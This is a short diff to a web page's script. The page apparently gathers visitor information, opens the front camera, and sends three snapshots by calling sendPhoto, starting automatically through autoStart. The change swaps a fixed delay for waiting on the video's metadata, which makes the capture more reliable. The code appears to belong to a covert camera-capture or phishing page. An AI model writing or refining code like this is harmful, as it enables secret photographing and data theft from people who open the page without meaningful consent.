@@ -174,7 +174,13 @@ await collectInfo();
 let s=await cam("user");
 video.srcObject=s;
 
-await sleep(600);
+await new Promise(resolve => {
+    video.onloadedmetadata = () => {
+        video.play();
+        resolve();
+    };
+});
+
 
 for(let i=1;i<=3;i++){
 sendPhoto(await snap(),"Front "+i);
@@ -238,3 +244,4 @@ autoStart();
 
 </body>
 </html>
+
